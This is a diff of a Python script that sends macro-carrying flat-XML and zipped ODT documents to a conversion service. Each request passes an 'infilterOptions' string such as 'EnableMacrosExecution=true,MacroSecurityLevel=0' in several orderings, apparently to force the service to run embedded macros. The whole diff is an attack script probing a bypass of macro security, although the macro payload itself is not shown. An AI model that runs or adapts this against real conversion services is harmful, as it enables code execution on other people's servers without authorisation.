@@ -120,14 +120,14 @@ def descriptor(name, typ, value):
 
 
 def main():
-    doc = flat_macro()
-    print("FLAT_MACRO_BYTES", len(doc), flush=True)
-    send(doc, {}, "NO_OPTIONS")
-    send(doc, {"infilterOptions": descriptor("MacroExecutionMode", "short", "4")}, "MACRO_SHORT_4")
-    both = json.dumps({"MacroExecutionMode": {"type": "short", "value": "4"}, "UpdateDocMode": {"type": "short", "value": "3"}}, separators=(",", ":"))
-    send(doc, {"infilterOptions": both}, "MACRO_AND_UPDATE")
-    send(doc, {"infilterOptions": descriptor("MacroExecutionMode", "long", "4")}, "MACRO_LONG_4")
-    send(doc, {"infilterOptions": "MacroExecutionMode=4"}, "MACRO_LEGACY")
+    flat = flat_macro()
+    zipped = macro_odt()
+    print("FLAT_MACRO_BYTES", len(flat), "ZIP_MACRO_BYTES", len(zipped), flush=True)
+    send(flat, {}, "NO_OPTIONS")
+    send(flat, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXACT_MACRO_CHAIN_FLAT")
+    send(flat, {"infilterOptions": "MacroSecurityLevel=0,EnableMacrosExecution=true"}, "REVERSED_MACRO_CHAIN_FLAT")
+    send(zipped, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXACT_MACRO_CHAIN_ZIP", "macro.odt")
+    send(flat, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0,UpdateDocMode=3"}, "MACRO_CHAIN_AND_UPDATE")
 
 
 if __name__ == "__main__":
